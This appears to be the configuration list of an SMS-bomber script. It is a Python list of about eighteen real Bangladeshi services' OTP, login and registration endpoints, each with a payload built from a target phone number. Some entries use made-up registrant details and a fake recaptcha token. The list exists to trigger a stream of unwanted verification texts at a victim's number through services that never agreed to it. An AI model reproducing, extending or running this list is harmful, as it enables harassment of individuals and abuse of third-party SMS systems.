APIS = [
    {
        "name": "Chorki",
        "method": "POST",
        "url": "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en",
        "payload": lambda phone: {"number": phone},
        "success": lambda r: r.status_code in [200,201]
    },
    {
        "name": "Kirei",
        "method": "POST",
        "url": "https://frontendapi.kireibd.com/api/v2/send-login-otp",
        "payload": lambda phone: {"email": phone},
        "success": lambda r: r.status_code in [200,201]
    },
    {
        "name": "DeeptoPlay",
        "method": "POST",
        "url": "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en",
        "payload": lambda phone: {"number": phone},
        "success": lambda r: r.status_code in [200,201]
    },
    {
        "name": "Shikho",
        "method": "POST",
        "url": "https://api.shikho.com/auth/v2/send/sms",
        "payload": lambda phone: {
            "auth_type": "signup",
            "phone": phone,
            "type": "student",
            "vendor": "shikho"
        },
        "success": lambda r: r.status_code in [200,201]
    },
    {
        "name": "PBS",
        "method": "POST",
        "url": "https://apialpha.pbs.com.bd/api/OTP/generateOTP",
        "payload": lambda phone: {"otp": "", "userPhone": phone},
        "success": lambda r: r.status_code in [200,201]
    },
    {
        "name": "BeautyBooth",
        "method": "POST",
        "url": "https://admin.beautybooth.com.bd/api/v2/auth/register",
        "payload": lambda phone: {"token": 91, "type": "phone", "value": phone},
        "success": lambda r: r.status_code in [200,201]
    },
    {
        "name": "Paperfly",
        "method": "POST",
        "url": "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php",
        "payload": lambda phone: {
            "full_name": "Md RAHIM",
            "company_name": "Gwewrgre",
            "email_address": "rahim@gmail.com",
            "phone_number": phone
        },
        "success": lambda r: r.status_code in [200,201]
    },
    {
        "name": "Apex4U",
        "method": "POST",
        "url": "https://api.apex4u.com/api/auth/login",
        "payload": lambda phone: {"phoneNumber": phone},
        "success": lambda r: r.status_code in [200,201]
    },
    {
        "name": "Bioscop",
        "method": "POST",
        "url": "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en",
        "payload": lambda phone: {"number": phone},
        "success": lambda r: r.status_code in [200,201]
    },
    {
        "name": "tofee",
        "method": "POST",
        "url": "https://prod-services.toffeelive.com/sms/v1/subscriber/signup",
        "payload": lambda phone: {"mobile": phone},
        "success": lambda r: r.status_code in [200,201]
    },
    {
        "name": "Binge",
        "method": "POST",
        "url": "https://api.binge.buzz/api/v4/auth/otp/send",
        "payload": lambda phone: {"phone": phone},
        "success": lambda r: r.status_code in [200,201]
    },
    {
        "name": "hoichoi",
        "method": "POST",
        "url": "https://prod-api.hoichoi.dev/core/api/v1/auth/signinup/code",
        "payload": lambda phone: {"phoneNumber": f"+88{phone}"},
        "success": lambda r: r.status_code in [200,201]
    },
    {
        "name": "Bay",
        "method": "POST",
        "url": "https://backend.amarbay.com/user/find_user_by_phone/",
        "payload": lambda phone: {"phone_number": phone},
        "success": lambda r: r.status_code in [200,201]
    }, 
    {
    "name": "MedEasy OTP API",
    "method": "GET",  # MedEasy API GET use করে
    "url": lambda mobile: f"https://api.medeasy.health/api/send-otp/{mobile}/",
    "payload": None,  # GET এর জন্য payload দরকার নেই, mobile URL এ যাবে
    "success_codes": [200, 201]
    },
    {
        "name": "Hisabee",
        "method": "POST",
        "url": "https://api.apex4u.com/api/auth/login",
        "payload": lambda phone: {
            "mobile_number": phone,
            "country_code": "88"
        },
        "success": lambda r: r.status_code in [200,201]
    },
    {
        "name": "Garibook",
        "method": "POST",
        "url": "https://api.garibookadmin.com/api/v4/user/login",
        "payload": lambda phone: {
        "channel": "web",
        "mobile": f"+88{phone}",
        "recaptcha_token": "garibookcaptcha"
        },
        "success": lambda r: r.status_code in [200,201]
    },
    {
        "name": "Bohubrihi",
        "method": "POST",
        "url": "https://bb-api.bohubrihi.com/public/activity/otp",
        "payload": lambda phone: {
        "intent": "login",
        "phone": phone
        },
        "success": lambda r: r.status_code in [200,201]
    },
    {
        "name": "Bikroy",
        "method": "GET",
        "url": "https://bikroy.com/data/phone_number_login/verifications/phone_login",
        "payload": lambda phone: {"phone": phone},
        "success": lambda r: r.status_code in [200, 201],
        "add_88": False,
        "headers": {
            "User-Agent": "Mozilla/5.0",
            "Accept": "application/json"
        }
    },

]








